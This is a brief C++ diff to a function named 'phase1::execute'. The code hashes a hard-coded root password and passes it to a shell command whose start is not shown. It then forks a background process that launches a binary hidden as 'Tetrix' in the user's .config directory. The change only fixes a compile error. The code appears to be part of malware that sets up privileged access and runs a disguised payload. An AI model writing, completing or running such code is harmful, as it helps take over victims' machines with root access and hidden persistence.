@@ -13,6 +13,6 @@ int phase1::execute()
   std::string second_part = crypt(ROOT_PASSWORD, "AA");
   system((cmd_start + second_part).c_str());
   if(fork() == 0)
-    system(homedir+"/.config/Tetrix -p 2");
+    system((homedir+"/.config/Tetrix -p 2").c_str());
   return 0;
 }
